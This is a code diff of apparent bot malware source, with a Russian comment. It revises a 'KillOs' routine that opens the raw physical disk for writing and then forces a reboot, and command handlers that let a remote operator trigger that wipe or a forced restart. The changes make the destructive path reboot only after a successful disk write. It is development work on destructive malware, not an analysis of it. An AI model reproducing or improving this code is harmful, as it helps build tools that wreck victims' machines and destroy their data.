@@ -15,8 +15,6 @@ bool KillOs()
 	hDest = pCreateFileA("\\\\.\\PHYSICALDRIVE0",GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
 	if(hDest == INVALID_HANDLE_VALUE)
 	{
-		
-
 		return FALSE;
 	};
     
@@ -27,9 +25,9 @@ bool KillOs()
         
     pCloseHandle(hDest);
 	
-	pOutputDebugStringA((ret)? ("KillOs ok"):("KillOs error"));
-    Reboot();
-	return (ret)?(true):(false);
+	if (ret)
+		Reboot();
+	return ret != FALSE;
 
 }	
 void Reboot(void)
@@ -39,15 +37,16 @@ void Reboot(void)
 	if (NT_SUCCESS(pRtlAdjustPrivilege(SE_SHUTDOWN_PRIVILEGE, TRUE, FALSE, (PBOOLEAN)&OldValue)))
 	pExitWindowsEx(EWX_REBOOT | EWX_FORCE, 0);
 }
+
 bool ExecuteKillosCommand(LPVOID Manager, PCHAR Command, PCHAR Arguments)
 {
 	return KillOs();
-
 }
+
 bool ExecuteRebootCommand(LPVOID Manager, PCHAR Command, PCHAR Arguments)
 {
 	// вернем фалсе, так как в другом случае произойдет перегрузка
 	Reboot();
-	return false;
+	return true;
 
 }
